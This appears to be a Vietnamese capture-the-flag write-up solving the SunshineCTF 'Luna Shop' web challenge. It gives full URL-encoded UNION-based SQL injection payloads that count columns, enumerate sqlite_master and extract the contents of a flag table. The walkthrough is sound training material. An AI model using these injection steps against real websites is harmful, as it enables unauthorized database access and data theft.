# WEB
**Luna Shop**
*We have amazing new products for our gaming service! Unfortunately we don't sell our unreleased flag product yet !*

**Fuzzing is NOT allowed for this challenge, doing so will lead to IP rate limiting!**
[chall](https://meteor.sunshinectf.games)
## Tóm tắt
Chall cung cấp một trang web truy vấn thông tin sản phẩm.Khai thác trang web này bằng sql injection để lấy cờ 
## Khai thác
1. Test trang web 
![alt text](image.png)
Khi chọn vào product 1 sẽ xuất hiện thông tin của nó kèm với đường link https://meteor.sunshinectf.games/product?product_id=1 
2. Khai thác tìm nơi hiển thị dữ liệu 
Sửa đường link bằng cách thêm UNION select 1,2,3,4-- xem cột nào sẽ thay đổi dữ liệu từ đó có thể hiển thị flag
![alt text](image-1.png)
Điều này xác nhận được rằng bảng product này có 4 cột và dùng cột name để hiển thị dữ liệu 
3. Tìm bảng chứa flag 
Truy vấn tìm bảng chứa flag bằng 
https://meteor.sunshinectf.games/product?product_id=1%20UNION%20SELECT%201,name,3,4%20from%20sqlite_master%20where%20type=%27table%27--
![alt text](image-2.png)
Xuất hiện 1 bảng có tên là flag 
4. Tìm cột trong bảng flag
https://meteor.sunshinectf.games/product?product_id=1%20UNION%20SELECT%201,sql,3,4%20from%20sqlite_master%20where%20type=%27table%27--
![alt text](image-3.png)
Xuất hiện 1 cột có thên là flag với dữ liệu text
5. Truy vấn bảng flag để lấy flag
https://meteor.sunshinectf.games/product?product_id=2%20UNION%20SELECT%201,flag,3,4%20FROM%20flag%20--
![alt text](image-4.png)
